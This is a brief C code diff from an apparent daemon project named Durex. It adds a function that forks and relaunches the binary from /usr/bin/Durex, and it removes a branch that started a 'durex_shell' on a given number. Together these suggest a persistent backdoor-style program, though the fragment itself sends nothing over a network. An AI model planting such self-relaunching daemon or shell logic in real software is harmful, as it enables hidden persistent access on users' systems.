@@ -38,13 +38,22 @@ const char *get_login()
 	return "";
 }
 
+int		start_daemon(int argc, char **argv)
+{
+	(void)argc;
+	(void)argv;
+	char *const args[] = {"/usr/bin/Durex", NULL};
+
+	if (fork() == 0) {
+		execve(args[0], args, NULL);
+		exit(0);
+	}
+	usleep(50000);
+	return (0);
+}
+
 int		build_daemon(int argc, char **argv)
 {
-	if (argc == 3 && strcmp(argv[1], "shell") == 0 && atoi(argv[2]) > 0)
-	{
-		durex_shell(atoi(argv[2]));
-		return (0);
-	}
 	for (int i = 1; i < argc; i++)
 	{
 		if (strcmp(argv[i], "status") == 0)
@@ -53,6 +62,10 @@ int		build_daemon(int argc, char **argv)
 			return (build_pid());
 		if (strcmp(argv[i], "version") == 0)
 			return (build_version());
+	}
+	if (strcmp(argv[0], "/usr/bin/Durex") != 0)
+	{
+		return (start_daemon(argc, argv));
 	}
 	printf("%s\n", get_login());
 	if (build_status() == 1)
